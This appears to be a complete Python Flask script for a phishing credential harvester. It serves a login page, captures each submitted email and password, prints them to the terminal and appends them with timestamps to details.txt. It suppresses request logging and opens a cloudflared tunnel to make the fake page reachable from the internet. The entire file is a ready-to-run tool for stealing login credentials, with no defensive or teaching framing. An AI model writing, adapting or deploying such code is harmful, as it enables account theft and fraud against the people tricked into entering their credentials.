from flask import Flask,render_template,request
import logging
from os import popen
from time import asctime

app = Flask(__name__)

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

@app.route("/",methods = ["POST","GET"])
def hello_world():
    if request.method == "POST":
        email= request.form['username']
        password = request.form['password']
        
        print(f"\n \033[1;32;40mEmail\033[0;33;40m :\033[1;34;40m{email}\n \033[1;32;40mPassword\033[1;30;40m :\033[01;34;40m{password}",end=" ")
        
        print("\033[0;33;40m")
        print("\n Details Saved in details.txt")
        current_time = asctime()
        
        with open('details.txt','a') as file:
            file.write(f"Email:  {email}    Password:  {password}\nTime:  {current_time}\n\n")
    
    return render_template('index.html')
  
if __name__ == '__main__':
    popen('cloudflared -url localhost:8080')
    app.run(port=8080)